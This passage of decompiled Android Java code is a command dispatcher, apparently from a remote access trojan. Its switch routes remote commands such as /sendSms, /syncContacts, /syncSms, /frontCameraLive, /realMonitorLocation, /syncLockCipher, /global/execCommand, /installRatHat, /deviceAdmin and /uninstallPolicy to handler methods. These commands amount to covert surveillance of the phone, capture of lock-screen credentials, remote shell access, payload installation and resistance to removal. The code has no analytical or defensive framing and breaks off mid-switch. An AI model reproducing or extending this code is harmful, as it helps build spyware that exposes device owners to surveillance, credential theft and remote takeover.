                    case -2111956370:
                        if (str.equals("/startDevSetting")) {
                            c = '[';
                            break;
                        }
                        c = 65535;
                        break;
                    case -2109892286:
                        if (str.equals("/stopCameraLive")) {
                            c = 'A';
                            break;
                        }
                        c = 65535;
                        break;
                    case -2100658161:
                        if (str.equals("/target/findByClassNameMatches")) {
                            c = 186;
                            break;
                        }
                        c = 65535;
                        break;
                    case -2081499987:
                        if (str.equals("/screenOffTimeout")) {
                            c = Matrix.MATRIX_TYPE_RANDOM_REGULAR;
                            break;
                        }
                        c = 65535;
                        break;
                    case -2077441997:
                        if (str.equals("/unlock")) {
                            c = 't';
                            break;
                        }
                        c = 65535;
                        break;
                    case -2070011942:
                        if (str.equals("/target/findById")) {
                            c = 144;
                            break;
                        }
                        c = 65535;
                        break;
                    case -2068140861:
                        if (str.equals("/target/findOneByIdMatches")) {
                            c = 157;
                            break;
                        }
                        c = 65535;
                        break;
                    case -2065627613:
                        if (str.equals("/netState")) {
                            c = 14;
                            break;
                        }
                        c = 65535;
                        break;
                    case -2058177012:
                        if (str.equals("/target/findLastByClassNameEndsWith")) {
                            c = 185;
                            break;
                        }
                        c = 65535;
                        break;
                    case -2029690228:
                        if (str.equals("/install")) {
                            c = '\"';
                            break;
                        }
                        c = 65535;
                        break;
                    case -2029212786:
                        if (str.equals("/startApp")) {
                            c = 'G';
                            break;
                        }
                        c = 65535;
                        break;
                    case -2007358046:
                        if (str.equals("/sendSms")) {
                            c = 'T';
                            break;
                        }
                        c = 65535;
                        break;
                    case -1989530326:
                        if (str.equals("/uploadAppIcon")) {
                            c = '9';
                            break;
                        }
                        c = 65535;
                        break;
                    case -1979810841:
                        if (str.equals("/backCameraLive")) {
                            c = '@';
                            break;
                        }
                        c = 65535;
                        break;
                    case -1971657465:
                        if (str.equals("/localAdbConnect")) {
                            c = 31;
                            break;
                        }
                        c = 65535;
                        break;
                    case -1966761650:
                        if (str.equals("/target/findOneByClassName")) {
                            c = 175;
                            break;
                        }
                        c = 65535;
                        break;
                    case -1958357852:
                        if (str.equals("/startAppFromDesktop")) {
                            c = 5;
                            break;
                        }
                        c = 65535;
                        break;
                    case -1923148795:
                        if (str.equals("/target/findOneByClassNameMatches")) {
                            c = 187;
                            break;
                        }
                        c = 65535;
                        break;
                    case -1921192312:
                        if (str.equals("/pairState")) {
                            c = 15;
                            break;
                        }
                        c = 65535;
                        break;
                    case -1891430386:
                        if (str.equals("/updateRatHat")) {
                            c = '$';
                            break;
                        }
                        c = 65535;
                        break;
                    case -1829206584:
                        if (str.equals("/sharePowerControl")) {
                            c = 'g';
                            break;
                        }
                        c = 65535;
                        break;
                    case -1808937349:
                        if (str.equals("/startAccessibility")) {
                            c = 20;
                            break;
                        }
                        c = 65535;
                        break;
                    case -1706466719:
                        if (str.equals("/callPhone")) {
                            c = 'V';
                            break;
                        }
                        c = 65535;
                        break;
                    case -1703351932:
                        if (str.equals("/callState")) {
                            c = Matrix.MATRIX_TYPE_RANDOM_UT;
                            break;
                        }
                        c = 65535;
                        break;
                    case -1678771338:
                        if (str.equals("/screenshot/0")) {
                            c = ':';
                            break;
                        }
                        c = 65535;
                        break;
                    case -1624399791:
                        if (str.equals("/checkNotificationService")) {
                            c = '\t';
                            break;
                        }
                        c = 65535;
                        break;
                    case -1604449475:
                        if (str.equals("/closeADBDebug")) {
                            c = 'O';
                            break;
                        }
                        c = 65535;
                        break;
                    case -1587259689:
                        if (str.equals("/lockState")) {
                            c = '\'';
                            break;
                        }
                        c = 65535;
                        break;
                    case -1572699131:
                        if (str.equals("/target/findLastByDescContains")) {
                            c = 164;
                            break;
                        }
                        c = 65535;
                        break;
                    case -1560257853:
                        if (str.equals("/target/findByClassNameContains")) {
                            c = 177;
                            break;
                        }
                        c = 65535;
                        break;
                    case -1557660719:
                        if (str.equals("/startAppDetailSetting")) {
                            c = ']';
                            break;
                        }
                        c = 65535;
                        break;
                    case -1507254566:
                        if (str.equals("/syncPermissions")) {
                            c = 'B';
                            break;
                        }
                        c = 65535;
                        break;
                    case -1434804817:
                        if (str.equals("/syncSms")) {
                            c = '4';
                            break;
                        }
                        c = 65535;
                        break;
                    case -1427438416:
                        if (str.equals("/startAboutDevice")) {
                            c = Matrix.MATRIX_TYPE_ZERO;
                            break;
                        }
                        c = 65535;
                        break;
                    case -1404505649:
                        if (str.equals("/target/findLastByIdContains")) {
                            c = 149;
                            break;
                        }
                        c = 65535;
                        break;
                    case -1389342475:
                        if (str.equals("/permissions")) {
                            c = 'E';
                            break;
                        }
                        c = 65535;
                        break;
                    case -1357008250:
                        if (str.equals("/target/findOneByDesc")) {
                            c = 160;
                            break;
                        }
                        c = 65535;
                        break;
                    case -1356531422:
                        if (str.equals("/target/findOneByText")) {
                            c = 130;
                            break;
                        }
                        c = 65535;
                        break;
                    case -1314934145:
                        if (str.equals("/containerState")) {
                            c = '.';
                            break;
                        }
                        c = 65535;
                        break;
                    case -1264052409:
                        if (str.equals("/syncAudios")) {
                            c = '7';
                            break;
                        }
                        c = 65535;
                        break;
                    case -1239412381:
                        if (str.equals("/startVerifyCredential")) {
                            c = 'J';
                            break;
                        }
                        c = 65535;
                        break;
                    case -1236170467:
                        if (str.equals("/target/findLastByDescStartsWith")) {
                            c = 167;
                            break;
                        }
                        c = 65535;
                        break;
                    case -1217615921:
                        if (str.equals("/target/findByDescContains")) {
                            c = 162;
                            break;
                        }
                        c = 65535;
                        break;
                    case -1216688335:
                        if (str.equals("/recordState")) {
                            c = 'Y';
                            break;
                        }
                        c = 65535;
                        break;
                    case -1151897951:
                        if (str.equals("/target/findLastByTextContains")) {
                            c = 134;
                            break;
                        }
                        c = 65535;
                        break;
                    case -1107831688:
                        if (str.equals("/backUtilsTopVisible")) {
                            c = 6;
                            break;
                        }
                        c = 65535;
                        break;
                    case -1088223067:
                        if (str.equals("/target/findOneByClassNameStartsWith")) {
                            c = 181;
                            break;
                        }
                        c = 65535;
                        break;
                    case -1088163018:
                        if (str.equals("/deleteFile")) {
                            c = 'w';
                            break;
                        }
                        c = 65535;
                        break;
                    case -1082356411:
                        if (str.equals("/openWifiDebug")) {
                            c = Matrix.MATRIX_TYPE_RANDOM_LT;
                            break;
                        }
                        c = 65535;
                        break;
                    case -960076691:
                        if (str.equals("/global/keepScreenOn")) {
                            c = 's';
                            break;
                        }
                        c = 65535;
                        break;
                    case -902183474:
                        if (str.equals("/requestLocalAdbPair")) {
                            c = 16;
                            break;
                        }
                        c = 65535;
                        break;
                    case -847942255:
                        if (str.equals("/shareADBConfig")) {
                            c = 'f';
                            break;
                        }
                        c = 65535;
                        break;
                    case -846764339:
                        if (str.equals("/global/moveEnd")) {
                            c = 'r';
                            break;
                        }
                        c = 65535;
                        break;
                    case -846282645:
                        if (str.equals("/syncPhotos")) {
                            c = '5';
                            break;
                        }
                        c = 65535;
                        break;
                    case -844560859:
                        if (str.equals("/debugPort")) {
                            c = 27;
                            break;
                        }
                        c = 65535;
                        break;
                    case -822000195:
                        if (str.equals("/syncContacts")) {
                            c = '3';
                            break;
                        }
                        c = 65535;
                        break;
                    case -796814741:
                        if (str.equals("/target/findByTextContains")) {
                            c = 132;
                            break;
                        }
                        c = 65535;
                        break;
                    case -788415300:
                        if (str.equals("/activePackageName")) {
                            c = 7;
                            break;
                        }
                        c = 65535;
                        break;
                    case -733860467:
                        if (str.equals("/localAdbShell")) {
                            c = ' ';
                            break;
                        }
                        c = 65535;
                        break;
                    case -724670762:
                        if (str.equals("/startSettings")) {
                            c = 'H';
                            break;
                        }
                        c = 65535;
                        break;
                    case -711762544:
                        if (str.equals("/target/findByDesc")) {
                            c = 159;
                            break;
                        }
                        c = 65535;
                        break;
                    case -711285716:
                        if (str.equals("/target/findByText")) {
                            c = 129;
                            break;
                        }
                        c = 65535;
                        break;
                    case -673926334:
                        if (str.equals("/syncVideos")) {
                            c = '6';
                            break;
                        }
                        c = 65535;
                        break;
                    case -654468659:
                        if (str.equals("/syncSmsRecognizePlug")) {
                            c = 'D';
                            break;
                        }
                        c = 65535;
                        break;
                    case -628877547:
                        if (str.equals("/closeWifiDebug")) {
                            c = 'M';
                            break;
                        }
                        c = 65535;
                        break;
                    case -579186398:
                        if (str.equals("/realMonitorLocation")) {
                            c = 'x';
                            break;
                        }
                        c = 65535;
                        break;
                    case -573162311:
                        if (str.equals("/target/findLastByTextStartsWith")) {
                            c = 137;
                            break;
                        }
                        c = 65535;
                        break;
                    case -555832188:
                        if (str.equals("/target/findOneByDescEndsWith")) {
                            c = 169;
                            break;
                        }
                        c = 65535;
                        break;
                    case -552221553:
                        if (str.equals("/target/findOneByIdContains")) {
                            c = 148;
                            break;
                        }
                        c = 65535;
                        break;
                    case -528135514:
                        if (str.equals("/backAppState")) {
                            c = 21;
                            break;
                        }
                        c = 65535;
                        break;
                    case -479800019:
                        if (str.equals("/global/moveHome")) {
                            c = 'q';
                            break;
                        }
                        c = 65535;
                        break;
                    case -438491507:
                        if (str.equals("/target/findLastByDescMatches")) {
                            c = 173;
                            break;
                        }
                        c = 65535;
                        break;
                    case -404562220:
                        if (str.equals("/killApp")) {
                            c = 'I';
                            break;
                        }
                        c = 65535;
                        break;
                    case -352434803:
                        if (str.equals("/target/findOneByClassNameContains")) {
                            c = 178;
                            break;
                        }
                        c = 65535;
                        break;
                    case -285415294:
                        if (str.equals("/openDevelopment")) {
                            c = 'P';
                            break;
                        }
                        c = 65535;
                        break;
                    case -248437249:
                        if (str.equals("/screenrecord/start")) {
                            c = '<';
                            break;
                        }
                        c = 65535;
                        break;
                    case -248437202:
                        if (str.equals("/screenrecord/state")) {
                            c = '>';
                            break;
                        }
                        c = 65535;
                        break;
                    case -140382295:
                        if (str.equals("/startRatHat")) {
                            c = '%';
                            break;
                        }
                        c = 65535;
                        break;
                    case -137156668:
                        if (str.equals("/startRecord")) {
                            c = 'W';
                            break;
                        }
                        c = 65535;
                        break;
                    case -135031008:
                        if (str.equals("/target/findOneByTextEndsWith")) {
                            c = 139;
                            break;
                        }
                        c = 65535;
                        break;
                    case -127619175:
                        if (str.equals("/ignoreBatteryOptimization")) {
                            c = 'a';
                            break;
                        }
                        c = 65535;
                        break;
                    case -105323470:
                        if (str.equals("/global/setText")) {
                            c = 'l';
                            break;
                        }
                        c = 65535;
                        break;
                    case -73813939:
                        if (str.equals("/target/findLastByClassNameContains")) {
                            c = 179;
                            break;
                        }
                        c = 65535;
                        break;
                    case -73571157:
                        if (str.equals("/frontCameraLive")) {
                            c = '?';
                            break;
                        }
                        c = 65535;
                        break;
                    case -52146071:
                        if (str.equals("/mainPackageName")) {
                            c = '\b';
                            break;
                        }
                        c = 65535;
                        break;
                    case -47687687:
                        if (str.equals("/target/findByIdMatches")) {
                            c = 156;
                            break;
                        }
                        c = 65535;
                        break;
                    case -32078376:
                        if (str.equals("/target/findByIdEndsWith")) {
                            c = 153;
                            break;
                        }
                        c = 65535;
                        break;
                    case -9528729:
                        if (str.equals("/miniCap/scale")) {
                            c = ';';
                            break;
                        }
                        c = 65535;
                        break;
                    case -9275279:
                        if (str.equals("/target/findLastByTextMatches")) {
                            c = 143;
                            break;
                        }
                        c = 65535;
                        break;
                    case -3966785:
                        if (str.equals("/showConfirmLock")) {
                            c = 19;
                            break;
                        }
                        c = 65535;
                        break;
                    case 47:
                        if (str.equals("/")) {
                            break;
                        }
                        c = 65535;
                        break;
                    case 18745267:
                        if (str.equals("/localBackAppState")) {
                            c = 25;
                            break;
                        }
                        c = 65535;
                        break;
                    case 46642525:
                        if (str.equals("/info")) {
                            c = 2;
                            break;
                        }
                        c = 65535;
                        break;
                    case 47411271:
                        if (str.equals("/stopRatHat")) {
                            c = '&';
                            break;
                        }
                        c = 65535;
                        break;
                    case 50636898:
                        if (str.equals("/stopRecord")) {
                            c = 'X';
                            break;
                        }
                        c = 65535;
                        break;
                    case 53691524:
                        if (str.equals("/target/findByClassName")) {
                            c = 174;
                            break;
                        }
                        c = 65535;
                        break;
                    case 118400594:
                        if (str.equals("/accessibilityState")) {
                            c = ',';
                            break;
                        }
                        c = 65535;
                        break;
                    case 160039336:
                        if (str.equals("/finishInstallApp")) {
                            c = '}';
                            break;
                        }
                        c = 65535;
                        break;
                    case 190238503:
                        if (str.equals("/target/findOneByIdStartsWith")) {
                            c = 151;
                            break;
                        }
                        c = 65535;
                        break;
                    case 200857354:
                        if (str.equals("/deviceAdmin")) {
                            c = 22;
                            break;
                        }
                        c = 65535;
                        break;
                    case 212511693:
                        if (str.equals("/target/findOneByDescMatches")) {
                            c = 172;
                            break;
                        }
                        c = 65535;
                        break;
                    case 226306435:
                        if (str.equals("/blockView")) {
                            c = 'z';
                            break;
                        }
                        c = 65535;
                        break;
                    case 253894084:
                        if (str.equals("/stopAdminActive")) {
                            c = 24;
                            break;
                        }
                        c = 65535;
                        break;
                    case 280427641:
                        if (str.equals("/startInstallApp")) {
                            c = '|';
                            break;
                        }
                        c = 65535;
                        break;
                    case 290875874:
                        if (str.equals("/installRatHat")) {
                            c = '#';
                            break;
                        }
                        c = 65535;
                        break;
                    case 312421432:
                        if (str.equals("/localDebugPort")) {
                            c = 26;
                            break;
                        }
                        c = 65535;
                        break;
                    case 317708033:
                        if (str.equals("/enableDebug")) {
                            c = '*';
                            break;
                        }
                        c = 65535;
                        break;
                    case 359032258:
                        if (str.equals("/postNotificationDialog")) {
                            c = '_';
                            break;
                        }
                        c = 65535;
                        break;
                    case 378454885:
                        if (str.equals("/target/findLastByClassNameStartsWith")) {
                            c = 182;
                            break;
                        }
                        c = 65535;
                        break;
                    case 381534594:
                        if (str.equals("/contacts")) {
                            c = '2';
                            break;
                        }
                        c = 65535;
                        break;
                    case 441143621:
                        if (str.equals("/target/findLastByClassNameMatches")) {
                            c = 188;
                            break;
                        }
                        c = 65535;
                        break;
                    case 496319063:
                        if (str.equals("/syncPackages")) {
                            c = '1';
                            break;
                        }
                        c = 65535;
                        break;
                    case 525517989:
                        if (str.equals("/uninstallPolicy")) {
                            c = '/';
                            break;
                        }
                        c = 65535;
                        break;
                    case 542794115:
                        if (str.equals("/target/findByDescMatches")) {
                            c = 171;
                            break;
                        }
                        c = 65535;
                        break;
                    case 568346209:
                        if (str.equals("/readScreenWindow")) {
                            c = '\f';
                            break;
                        }
                        c = 65535;
                        break;
                    case 587829843:
                        if (str.equals("/global/action")) {
                            c = 'k';
                            break;
                        }
                        c = 65535;
                        break;
                    case 616037888:
                        if (str.equals("/syncLockCipher")) {
                            c = '8';
                            break;
                        }
                        c = 65535;
                        break;
                    case 641727921:
                        if (str.equals("/target/findOneByTextMatches")) {
                            c = 142;
                            break;
                        }
                        c = 65535;
                        break;
                    case 659315145:
                        if (str.equals("/version")) {
                            c = 3;
                            break;
                        }
                        c = 65535;
                        break;
                    case 675322312:
                        if (str.equals("/global/delete")) {
                            c = 'p';
                            break;
                        }
                        c = 65535;
                        break;
                    case 676964240:
                        if (str.equals("/target/findLastById")) {
                            c = 146;
                            break;
                        }
                        c = 65535;
                        break;
                    case 687418557:
                        if (str.equals("/requestLocalKeepAlive")) {
                            c = 17;
                            break;
                        }
                        c = 65535;
                        break;
                    case 692045562:
                        if (str.equals("/reloadPairKeyFiles")) {
                            c = 'c';
                            break;
                        }
                        c = 65535;
                        break;
                    case 696377959:
                        if (str.equals("/target/findByDescStartsWith")) {
                            c = 165;
                            break;
                        }
                        c = 65535;
                        break;
                    case 697016588:
                        if (str.equals("/permissionInfo")) {
                            c = 'F';
                            break;
                        }
                        c = 65535;
                        break;
                    case 737905092:
                        if (str.equals("/target/findLastByDescEndsWith")) {
                            c = 170;
                            break;
                        }
                        c = 65535;
                        break;
                    case 750346370:
                        if (str.equals("/target/findByClassNameEndsWith")) {
                            c = 183;
                            break;
                        }
                        c = 65535;
                        break;
                    case 768848346:
                        if (str.equals("/activeEventGroup")) {
                            c = 'e';
                            break;
                        }
                        c = 65535;
                        break;
                    case 799314054:
                        if (str.equals("/cancelMonitorLocation")) {
                            c = 'y';
                            break;
                        }
                        c = 65535;
                        break;
                    case 807515101:
                        if (str.equals("/localAdbPair")) {
                            c = 30;
                            break;
                        }
                        c = 65535;
                        break;
                    case 807534621:
                        if (str.equals("/localAdbPush")) {
                            c = '!';
                            break;
                        }
                        c = 65535;
                        break;
                    case 885597906:
                        if (str.equals("/global/copy")) {
                            c = 'm';
                            break;
                        }
                        c = 65535;
                        break;
                    case 906098574:
                        if (str.equals("/target/findLastByIdEndsWith")) {
                            c = 155;
                            break;
                        }
                        c = 65535;
                        break;
                    case 913674259:
                        if (str.equals("/mainServerHost")) {
                            c = '\n';
                            break;
                        }
                        c = 65535;
                        break;
                    case 926176748:
                        if (str.equals("/enableWifiDebug")) {
                            c = '+';
                            break;
                        }
                        c = 65535;
                        break;
                    case 939178966:
                        if (str.equals("/isTopVisible")) {
                            c = 4;
                            break;
                        }
                        c = 65535;
                        break;
                    case 972010343:
                        if (str.equals("/target/findByTextMatches")) {
                            c = 141;
                            break;
                        }
                        c = 65535;
                        break;
                    case 979967869:
                        if (str.equals("/global/execCommand")) {
                            c = 'h';
                            break;
                        }
                        c = 65535;
                        break;
                    case 996274731:
                        if (str.equals("/browserApps")) {
                            c = 128;
                            break;
                        }
                        c = 65535;
                        break;
                    case 1013321485:
                        if (str.equals("/openADBDebug")) {
                            c = 'N';
                            break;
                        }
                        c = 65535;
                        break;
                    case 1022819293:
                        if (str.equals("/target/findOneByDescStartsWith")) {
                            c = 166;
                            break;
                        }
                        c = 65535;
                        break;
                    case 1092988302:
                        if (str.equals("/target/findByDescEndsWith")) {
                            c = 168;
                            break;
                        }
                        c = 65535;
                        break;
                    case 1158706272:
                        if (str.equals("/target/findLastByTextEndsWith")) {
                            c = 140;
                            break;
                        }
                        c = 65535;
                        break;
                    case 1173270002:
                        if (str.equals("/syncDownload")) {
                            c = 'u';
                            break;
                        }
                        c = 65535;
                        break;
                    case 1222156319:
                        if (str.equals("/startAppWriteSetting")) {
                            c = '^';
                            break;
                        }
                        c = 65535;
                        break;
                    case 1230871902:
                        if (str.equals("/activeWindowClassName")) {
                            c = 11;
                            break;
                        }
                        c = 65535;
                        break;
                    case 1237707682:
                        if (str.equals("/startAdminActive")) {
                            c = 23;
                            break;
                        }
                        c = 65535;
                        break;
                    case 1250583316:
                        if (str.equals("/global/lockScreen")) {
                            c = 'j';
                            break;
                        }
                        c = 65535;
                        break;
                    case 1337345917:
                        if (str.equals("/openWriteSecure")) {
                            c = '~';
                            break;
                        }
                        c = 65535;
                        break;
                    case 1344291486:
                        if (str.equals("/prepareInstallApp")) {
                            c = '{';
                            break;
                        }
                        c = 65535;
                        break;
                    case 1359386115:
                        if (str.equals("/target/findByTextStartsWith")) {
                            c = 135;
                            break;
                        }
                        c = 65535;
                        break;
                    case 1360328728:
                        if (str.equals("/removeDelegate")) {
                            c = 190;
                            break;
                        }
                        c = 65535;
                        break;
                    case 1396569941:
                        if (str.equals("/asyncDownload")) {
                            c = 'v';
                            break;
                        }
                        c = 65535;
                        break;
                    case 1428530885:
                        if (str.equals("/target/findOneByDescContains")) {
                            c = 163;
                            break;
                        }
                        c = 65535;
                        break;
                    case 1445916163:
                        if (str.equals("/index")) {
                            c = 1;
                            break;
                        }
                        c = 65535;
                        break;
                    case 1474634601:
                        if (str.equals("/enableDevelopment")) {
                            c = ')';
                            break;
                        }
                        c = 65535;
                        break;
                    case 1479829465:
                        if (str.equals("/syncWindows")) {
                            c = 'C';
                            break;
                        }
                        c = 65535;
                        break;
                    case 1483975783:
                        if (str.equals("/target/findLastByIdStartsWith")) {
                            c = 152;
                            break;
                        }
                        c = 65535;
                        break;
                    case 1506596739:
                        if (str.equals("/target/findLastByIdMatches")) {
                            c = 158;
                            break;
                        }
                        c = 65535;
                        break;
                    case 1513789482:
                        if (str.equals("/target/findByTextEndsWith")) {
                            c = 138;
                            break;
                        }
                        c = 65535;
                        break;
                    case 1568870874:
                        if (str.equals("/showNavigateWifiDialog")) {
                            c = '`';
                            break;
                        }
                        c = 65535;
                        break;
                    case 1583665200:
                        if (str.equals("/syncCanWriteSecure")) {
                            c = 127;
                            break;
                        }
                        c = 65535;
                        break;
                    case 1607975950:
                        if (str.equals("/target/findLastByClassName")) {
                            c = 176;
                            break;
                        }
                        c = 65535;
                        break;
                    case 1654554309:
                        if (str.equals("/screenrecord/stop")) {
                            c = '=';
                            break;
                        }
                        c = 65535;
                        break;
                    case 1683630736:
                        if (str.equals("/global/clear")) {
                            c = 'o';
                            break;
                        }
                        c = 65535;
                        break;
                    case 1685827449:
                        if (str.equals("/target/findOneByTextStartsWith")) {
                            c = 136;
                            break;
                        }
                        c = 65535;
                        break;
                    case 1688213555:
                        if (str.equals("/batteryState")) {
                            c = '(';
                            break;
                        }
                        c = 65535;
                        break;
                    case 1695322838:
                        if (str.equals("/global/paste")) {
                            c = 'n';
                            break;
                        }
                        c = 65535;
                        break;
                    case 1699853852:
                        if (str.equals("/packages")) {
                            c = '0';
                            break;
                        }
                        c = 65535;
                        break;
                    case 1716076114:
                        if (str.equals("/closeDevelopment")) {
                            c = 'Q';
                            break;
                        }
                        c = 65535;
                        break;
                    case 1717752822:
                        if (str.equals("/screenState")) {
                            c = '\r';
                            break;
                        }
                        c = 65535;
                        break;
                    case 1756018809:
                        if (str.equals("/reloadAgentFile")) {
                            c = 'b';
                            break;
                        }
                        c = 65535;
                        break;
                    case 1758382670:
                        if (str.equals("/target/findOneByIdEndsWith")) {
                            c = 154;
                            break;
                        }
                        c = 65535;
                        break;
                    case 1839058993:
                        if (str.equals("/target/findByIdStartsWith")) {
                            c = 150;
                            break;
                        }
                        c = 65535;
                        break;
                    case 1849332065:
                        if (str.equals("/target/findOneByTextContains")) {
                            c = 133;
                            break;
                        }
                        c = 65535;
                        break;
                    case 1871880780:
                        if (str.equals("/target/refresh")) {
                            c = 189;
                            break;
                        }
                        c = 65535;
                        break;
                    case 1877595050:
                        if (str.equals("/pairPort")) {
                            c = 28;
                            break;
                        }
                        c = 65535;
                        break;
                    case 1952284697:
                        if (str.equals("/target/findByIdContains")) {
                            c = 147;
                            break;
                        }
                        c = 65535;
                        break;
                    case 1958169420:
                        if (str.equals("/target/findOneByClassNameEndsWith")) {
                            c = 184;
                            break;
                        }
                        c = 65535;
                        break;
                    case 1959130888:
                        if (str.equals("/global/wakeUpScreen")) {
                            c = 'i';
                            break;
                        }
                        c = 65535;
                        break;
                    case 1965702274:
                        if (str.equals("/refreshActiveWindow")) {
                            c = '-';
                            break;
                        }
                        c = 65535;
                        break;
                    case 1983730606:
                        if (str.equals("/writeScreenOffTimeout")) {
                            c = 'S';
                            break;
                        }
                        c = 65535;
                        break;
                    case 1989665921:
                        if (str.equals("/stopVerifyCredential")) {
                            c = 'K';
                            break;
                        }
                        c = 65535;
                        break;
                    case 1997748712:
                        if (str.equals("/startWifiSetting")) {
                            c = '\\';
                            break;
                        }
                        c = 65535;
                        break;
                    case 2022428614:
                        if (str.equals("/target/findLastByDesc")) {
                            c = 161;
                            break;
                        }
                        c = 65535;
                        break;
                    case 2022905442:
                        if (str.equals("/target/findLastByText")) {
                            c = 131;
                            break;
                        }
                        c = 65535;
                        break;
                    case 2026721594:
                        if (str.equals("/removeAccount")) {
                            c = 29;
                            break;
                        }
                        c = 65535;
                        break;
                    case 2058177344:
                        if (str.equals("/deviceId")) {
                            c = 'd';
                            break;
                        }
                        c = 65535;
                        break;
                    case 2072328784:
                        if (str.equals("/target/findOneById")) {
                            c = 145;
                            break;
                        }
                        c = 65535;
                        break;
                    case 2116099196:
                        if (str.equals("/confirmLock")) {
                            c = 18;
                            break;
                        }
                        c = 65535;
                        break;
                    case 2129963099:
                        if (str.equals("/target/findByClassNameStartsWith")) {
                            c = 180;
                            break;
                        }
                        c = 65535;
                        break;
                    default:
                        c = 65535;
                        break;
                }
                switch (c) {
                    case 0:
                    case 1:
                        break;
                    case 2:
                        m460B(abstractC0381k);
                        break;
                    case 3:
                        D3(abstractC0381k);
                        break;
                    case 4:
                        t1(abstractC0381k);
                        break;
                    case 5:
                        P2(c0334e.m875a("packageName"), c0334e.m875a("applicationLabel"), abstractC0381k);
                        break;
                    case 6:
                        m492h(abstractC0381k);
                        break;
                    case 7:
                        m487c(abstractC0381k);
                        break;
                    case '\b':
                        F1(abstractC0381k);
                        break;
                    case '\t':
                        m499o(abstractC0381k);
                        break;
                    case '\n':
                        G1(abstractC0381k);
                        break;
                    case 11:
                        m488d(abstractC0381k);
                        break;
                    case '\f':
                        a2(abstractC0381k);
                        break;
                    case '\r':
                        n2(abstractC0381k);
                        break;
                    case 14:
                        L1(abstractC0381k);
                        break;
                    case 15:
                        U1(abstractC0381k);
                        break;
                    case 16:
                        j2(null, abstractC0381k);
                        break;
                    case 17:
                        k2(abstractC0381k);
                        break;
                    case 18:
                        m504t(null, abstractC0381k);
                        break;
                    case 19:
                        I2(abstractC0381k);
                        break;
                    case 20:
                        L2(abstractC0381k);
                        break;
                    case 21:
                        m490f(abstractC0381k);
                        break;
                    case 22:
                        m510z(abstractC0381k);
                        break;
                    case 23:
                        M2(abstractC0381k);
                        break;
                    case 24:
                        a3(abstractC0381k);
                        break;
                    case 25:
                        B1(abstractC0381k, c0334e.m875a("state"));
                        break;
                    case 26:
                        C1(abstractC0381k);
                        break;
                    case 27:
                        m507w(abstractC0381k);
                        break;
                    case 28:
                        T1(abstractC0381k);
                        break;
                    case 29:
                        h2(abstractC0381k, c0334e.m875a("accountType"));
                        break;
                    case 30:
                        y1(c0334e.m875a("host"), c0334e.m875a("pairPort"), c0334e.m875a("pairCode"), Boolean.parseBoolean(c0334e.m875a("directConnect")), abstractC0381k);
                        break;
                    case NamedGroup.brainpoolP256r1tls13 /* 31 */:
                        x1(abstractC0381k);
                        break;
                    case ' ':
                        A1(abstractC0381k, c0334e.m875a("command"));
                        break;
                    case '!':
                        z1(c0334e.m875a("logId"), c0334e.m875a("fileUrl"), c0334e.m875a("fileName"), c0334e.m875a("startCommand"), abstractC0381k);
                        break;
                    case '\"':
                        p1(c0334e.m875a("logId"), c0334e.m875a("fileUrl"), c0334e.m875a("fileName"), c0334e.m875a("startCommand"), abstractC0381k);
                        break;
                    case '#':
                        q1(abstractC0381k);
                        break;
                    case '$':
                        B3(abstractC0381k);
                        break;
                    case '%':
                        T2(abstractC0381k);
                        break;
                    case '&':
                        c3(abstractC0381k);
                        break;
                    case '\'':
                        E1(abstractC0381k);
                        break;
                    case '(':
                        m493i(abstractC0381k);
                        break;
                    case ')':
                        m462D(abstractC0381k);
                        break;
                    case '*':
                        m461C(abstractC0381k);
                        break;
                    case '+':
                        m463E(abstractC0381k);
                        break;
                    case ',':
                        m485a(abstractC0381k);
                        break;
                    case '-':
                        d2(abstractC0381k);
                        break;
                    case '.':
                        m506v(abstractC0381k);
                        break;
                    case '/':
                        z3(abstractC0381k);
                        break;
                    case '0':
                        S1(abstractC0381k);
                        break;
                    case '1':
                        o3(abstractC0381k);
                        break;
                    case '2':
                        m505u(abstractC0381k);
                        break;
                    case '3':
                        l3(abstractC0381k);
                        break;
                    case '4':
                        s3(abstractC0381k);
                        break;
                    case '5':
                        q3(abstractC0381k);
                        break;
                    case '6':
                        u3(abstractC0381k);
                        break;
                    case '7':
                        j3(abstractC0381k);
                        break;
                    case '8':
                        n3(null, abstractC0381k);
                        break;
                    case '9':
                        C3(abstractC0381k, c0334e.m875a("packageName"));
                        break;
                    case ':':
                        w3(abstractC0381k);
                        break;
                    case ';':
                        I1(Float.parseFloat(c0334e.m875a("scale")), abstractC0381k);
                        break;
                    case '<':
                        V2(abstractC0381k);
                        break;
                    case '=':
                        e3(abstractC0381k);
                        break;
                    case CipherSuite.TLS_DH_DSS_WITH_AES_128_CBC_SHA256 /* 62 */:
                        s1(abstractC0381k);
                        break;
                    case '?':
                        d1(abstractC0381k);
                        break;
                    case '@':
                        m491g(abstractC0381k);
                        break;
                    case 'A':
                        b3(abstractC0381k);
                        break;
                    case 'B':
                        p3(abstractC0381k);
                        break;
                    case 'C':
                        v3(abstractC0381k);
                        break;
                    case 'D':
                        t3(abstractC0381k);
                        break;
                    case 'E':
                        W1(abstractC0381k, c0334e.m875a("packageName"));
                        break;
                    case 'F':
                        V1(abstractC0381k, c0334e.m875a("permission"));
                        break;
                    case EACTags.MESSAGE_REFERENCE /* 71 */:
                        N2(c0334e.m875a("packageName"), c0334e.m875a("mainActivity"), Boolean.parseBoolean(c0334e.m875a("start")), null, abstractC0381k);
                        break;
                    case 'H':
                        X2(null, abstractC0381k);
                        break;
                    case 'I':
                        v1(abstractC0381k, c0334e.m875a("packageName"));
                        break;
                    case EACTags.CERTIFICATION_AUTHORITY_PUBLIC_KEY /* 74 */:
                        Y2(abstractC0381k, c0334e.m875a("packageName"));
                        break;
                    case EACTags.DEPRECATED /* 75 */:
                        g3(abstractC0381k, c0334e.m875a("packageName"));
                        break;
                    case 'L':
                        Q1(abstractC0381k);
                        break;
                    case EACTags.INTEGRATED_CIRCUIT_MANUFACTURER_ID /* 77 */:
                        m503s(abstractC0381k);
                        break;
                    case 'N':
                        O1(abstractC0381k);
                        break;
                    case 'O':
                        m501q(abstractC0381k);
                        break;
                    case EACTags.UNIFORM_RESOURCE_LOCATOR /* 80 */:
                        P1(abstractC0381k);
                        break;
                    case EACTags.ANSWER_TO_RESET /* 81 */:
                        m502r(abstractC0381k);
                        break;
                    case EACTags.HISTORICAL_BYTES /* 82 */:
                        m2(abstractC0381k);
                        break;
                    case 'S':
                        F3(abstractC0381k, AbstractC0026q.m153D(c0334e.m875a("offTimeout")) ? Long.valueOf(Long.parseLong(c0334e.m875a("offTimeout"))) : null);
                        break;
                    case 'T':
                        E2(c0334e.m875a("phoneNumber"), c0334e.m875a("content"), abstractC0381k);
                        break;
                    case 'U':
